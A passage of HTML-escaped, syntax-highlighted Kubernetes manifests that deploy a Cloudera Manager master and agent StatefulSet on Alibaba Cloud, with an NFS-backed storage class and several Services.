        &lt;span class=&quot;no&quot;&gt;effect: NoSchedule&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;serviceAccountName: cloudera-sa&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;containers:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- image: registry.cn-hangzhou.aliyuncs.com/acs/alicloud-nas-controller:v1.8.4&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;        imagePullPolicy: Never&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;name: nfs-client&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;        securityContext:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;          privileged: true&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;volumeMounts:&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- name: nfs-client-root&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;mountPath: /persistentvolumes&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;env:&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- name: PROVISIONER_NAME&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;value: alicloud/nas&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- name: NFS_SERVER&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;value: 074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- name: NFS_PATH&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;value: /pv/cloudera/agent/&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;volumes:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- name: nfs-client-root&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;nfs:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;server: 074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;path: /pv/cloudera/agent/&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: storage.k8s.io/v1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: StorageClass&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;name: cloudera-storage&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;name: storage&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;eclaimPolicy: Delete&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;rovisioner: alicloud/nas&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: apps/v1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: Deployment&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;name: master-deploy&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;name: master-deploy&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;replicas: 1&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;revisionHistoryLimit: 2&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;selector:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;matchLabels:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;name: master&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;template:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;metadata:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;name: master&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;name: master&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;spec:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;tolerations:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- effect: NoSchedule&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;key: node-role.kubernetes.io/master&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;restartPolicy: Always&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;serviceAccountName: cloudera-sa&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;automountServiceAccountToken: true&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;hostname: master-svc&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;containers:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- name: cloudera-master&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;image: registry-vpc.cn-hangzhou.aliyuncs.com/huaching_prod/cloudera-master:5.14.2&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;        imagePullPolicy: IfNotPresent&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;resources:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;limits:&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;memory: &quot;4096Mi&quot;&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;cpu: &quot;1000m&quot;&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;lifecycle:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;preStop:&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;exec:&lt;/span&gt;
              &lt;span class=&quot;no&quot;&gt;command: [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;/cloudera-init/run/stop.sh &amp;gt;&amp;gt; /cloudera/log/stop.log 2&amp;gt;&amp;amp;1&quot;]&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;volumeMounts:&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;#- name: cloudera-init&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;#mountPath: /cloudera-init/run/&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- name: mysql&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;mountPath: /var/lib/mysql/&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- name: repo&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;mountPath: /opt/cloudera/parcel-repo/&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- name: config&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;mountPath: /opt/cm/etc/cloudera-scm-agent/&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;env:&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- name: HOSTNAME&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;valueFrom:&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;configMapKeyRef:&lt;/span&gt;
              &lt;span class=&quot;no&quot;&gt;name: cloudera-config&lt;/span&gt;
              &lt;span class=&quot;no&quot;&gt;key: master_host&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- name: POD_IP&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;valueFrom:&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;fieldRef:&lt;/span&gt;
              &lt;span class=&quot;no&quot;&gt;apiVersion: v1&lt;/span&gt;
              &lt;span class=&quot;no&quot;&gt;fieldPath: status.podIP&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- name: POD_NAME&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;valueFrom:&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;fieldRef:&lt;/span&gt;
              &lt;span class=&quot;no&quot;&gt;apiVersion: v1&lt;/span&gt;
              &lt;span class=&quot;no&quot;&gt;fieldPath: metadata.name&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;ports:&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- containerPort: 7180&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;name: ui&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- containerPort: 9000&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;name: agent&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- containerPort: 7182&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;name: server&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- containerPort: 7191&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;name: parcel&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- containerPort: 4434&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;name: parcel-ssl&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;securityContext:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;privileged: true&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;imagePullSecrets:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- name: registrykey-vpc&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;volumes:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- name: repo&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;nfs:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;server: 074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;path: /pv/cloudera/repo/&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- name: mysql&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;nfs:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;server: 074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;path: /pv/cloudera/master/&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;#- name: cloudera-init&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;#configMap:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;#name: cloudera-config&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;#defaultMode: 0751&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;#items:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;#- key: master.start&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;#path: start.sh&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;#- key: master.stop&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;#path: stop.sh&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;#- key: mysql.sql&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;#path: mysql.sql&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- name: config&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;configMap:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;name: cloudera-config&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;items:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;- key: config.ini&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;path: config.ini&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: v1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: Service&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;name: master-svc&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;name: master-svc&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;type: ClusterIP&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;clusterIP: None&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;ports:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;- name: agent&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;port: 9000&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;targetPort: 9000&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;- name: server&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;port: 7182&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;targetPort: 7182&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;- name: parcel&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;port: 7191&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;targetPort: 7191&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;- name: parcel-ssl&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;port: 4434&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;targetPort: 4434&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;- name: ui&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;port: 7180&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;targetPort: 7180&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;selector:&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;name: master&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: v1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: Service&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;name: master-external&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;name: master-external&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;type: ClusterIP&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;ports:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;- name: ui&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;port: 7180&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;targetPort: 7180&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;selector:&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;name: master&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: policy/v1beta1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: PodDisruptionBudget&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;name: agent-pdb&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;name: agent-pdb&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;selector:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;matchLabels:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;name: agent&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;maxUnavailable: 1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: v1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: Service&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;name: agent-svc&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;name: agent-svc&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;type: ClusterIP&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;clusterIP: None&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;ports:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;- name: agent&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;port: 9000&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;targetPort: 9000&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;- name: server&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;port: 7182&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;targetPort: 7182&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;- name: parcel&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;port: 7191&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;targetPort: 7191&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;- name: parcel-ssl&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;port: 4434&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;targetPort: 4434&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;- name: parcel-ssl2&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;port: 4433&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;protocol: TCP&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;targetPort: 4433&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;selector:&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;name: agent&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;--&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;piVersion: apps/v1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ind: StatefulSet&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;etadata:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;name: agent&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;name: agent-sts&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;pec:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;selector:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;matchLabels:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;name: agent&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;serviceName: agent-svc&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;updateStrategy:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;type: RollingUpdate&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;podManagementPolicy: OrderedReady&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;replicas: 3&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;revisionHistoryLimit: 2&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;template:&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;metadata:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;name: cagent&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;labels:&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;name: agent&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;app: cloudera&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;spec:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;tolerations:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- effect: NoSchedule&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;key: node-role.kubernetes.io/master&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;restartPolicy: Always&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;serviceAccountName: cloudera-sa&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;automountServiceAccountToken: true&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;containers:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- name: agent&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;image: registry-vpc.cn-hangzhou.aliyuncs.com/huaching_prod/cloudera-node:5.14.2&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;        imagePullPolicy: IfNotPresent&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;resources:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;limits:&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;memory: &quot;4096Mi&quot;&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;cpu: &quot;1000m&quot;&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;lifecycle:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;preStop:&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;exec:&lt;/span&gt;
              &lt;span class=&quot;no&quot;&gt;command: [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;/cloudera-init/run/stop.sh&quot;]&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;volumeMounts:&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- name: repo&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;mountPath: /opt/cloudera/parcel-repo/&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- name: lib&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;mountPath: /opt/cm/lib/cloudera-scm-agent/&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- name: config&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;mountPath: /opt/cm/etc/cloudera-scm-agent/&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;ports:&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- containerPort: 9000&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;name: agent&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- containerPort: 7182&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;name: server&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- containerPort: 7191&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;name: parcel&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- containerPort: 4434&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;name: parcel-ssl&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;- containerPort: 4433&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;name: parcel-ssl2&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;securityContext:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;privileged: true&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;imagePullSecrets:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- name: registrykey-vpc&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;volumes:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- name: config&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;configMap:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;name: cloudera-config&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;items:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;- key: config.ini&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;path: config.ini&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;- key: cron.tab&lt;/span&gt;
            &lt;span class=&quot;no&quot;&gt;path: cron.tab&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;- name: repo&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;nfs:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;server: 074ca49d80-ak47.cn-hangzhou.nas.aliyuncs.com&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;path: /pv/cloudera/repo/&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;volumeClaimTemplates:&lt;/span&gt;
  &lt;span class=&quot;no&quot;&gt;- metadata:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;name: lib&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;namespace: cloudera&lt;/span&gt;
    &lt;span class=&quot;no&quot;&gt;spec:&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;#volumeName: lib&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;volumeMode: Filesystem&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;accessModes: [ &quot;ReadWriteOnce&quot; ]&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;storageClassName: cloudera-storage&lt;/span&gt;
      &lt;span class=&quot;no&quot;&gt;resources:&lt;/span&gt;
        &lt;span class=&quot;no&quot;&gt;requests:&lt;/span&gt;
          &lt;span class=&quot;no&quot;&gt;storage: 20Gi&lt;/span&gt;
